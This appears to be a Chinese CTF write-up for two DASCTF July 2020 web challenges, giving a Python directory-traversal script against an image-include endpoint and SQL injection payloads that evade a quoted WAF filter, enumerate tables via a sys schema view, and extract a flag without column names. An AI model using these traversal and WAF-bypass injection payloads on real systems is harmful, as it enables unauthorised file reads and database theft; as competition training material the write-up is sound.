---
title: DASCTF2020.7月赛
date: 2020-07-25
image: 
description: 
categories: 
- ctf_writeup
tags:
- 无列名
---
### Ezfileinclude

考点：Unix时间戳、文件包含、目录穿越

开局一张图，发现源码 `image.php?t=1595664783&f=Z3F5LmpwZw==`

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120181135.png)

访问之，回显：`What's your time?` 仔细看t参数是一个unix时间戳，然后f是base64后的文件名；

直接写脚本，目录穿越读取/flag

```python
import time
import requests
import base64
 
t = int(time.time())
f = 'gqy.jpg?../../../../../../flag'
f = base64.b64encode(f.encode()).decode()
print(t, f)
 
host = 'http://183.129.189.60:10009/image.php?t={}&f={}'.format(t, f)
head = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
}
 
r = requests.get(url=host, headers=head)
print(r.text)
 
```

### SQLi

考点：无列名注入，sys.schema_tables_with_full_table_scans

访问要求传入id参数：

```
http://183.129.189.60:10004/?id=1;
```

 

返回waf：

```
return preg_match("/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&|like|-|`/i", $id); 
```

 

stat意味着过滤了sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer,mysql.innodb_table_stats

or意味着过滤了information_schema

由waf想到了union注入：

```
?id=0%27union/**/select/**/1,2,3%23
Array ( [0] => 1 [id] => 1 [1] => 2 [username] => 2 [2] => 3 [password] => 3 )
```

 

可以看到库名：

```
?id=0%27union/**/select/**/1,database(),3%23
sqlidb
```

 

上述bypass infomation_schema的方法都被过滤了，不过leon师傅在一次开发当中发现了另一个库：`sys.schema_tables_with_full_table_scans`

```
?id=0'/**/union/**/select/**/1,group_concat(object_name),3/**/from/**/sys.schema_tables_with_full_table_scans%23
#users,flllaaaggg,sys_config
```

接下来是无列名注入：

```
?id=0'/**/union/**/select/**/1,(select/**/a.2/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flllaaaggg)a/**/limit/**/1,1),3%23
flag{60325f20416b40b11b6049734bad11cf}
```